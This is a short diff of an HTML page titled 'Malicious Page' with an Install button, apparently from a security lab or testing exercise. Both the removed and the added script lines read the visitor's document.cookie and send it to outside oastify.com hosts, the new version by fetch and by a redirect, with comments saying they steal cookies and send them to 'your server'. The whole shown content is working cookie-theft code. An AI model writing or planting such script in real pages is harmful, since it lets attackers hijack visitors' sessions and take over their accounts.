@@ -7,11 +7,10 @@
     <h1>Malicious Page</h1>
     <button id="installbutton">Install</button>
     <script>
-        fetch('http://mf51f6p01jp4dfise46fdx2vwm2dq9ey.oastify.com', {
-            method: 'POST',
-            body: JSON.stringify({ cookies: document.cookie }),
-            headers: { 'Content-Type': 'application/json' }
-        });
+        // Steal cookies and send them to your server
+        fetch('http://p4u449e3qme72i7v37vi20rylprgfh36.oastify.com/steal?cookie=' + document.cookie);
+        // Or redirect to a page with the stolen cookies
+        window.location.href = 'http://p4u449e3qme72i7v37vi20rylprgfh36.oastify.com/steal?cookie=' + document.cookie;
     </script>
 </body>
 </html>
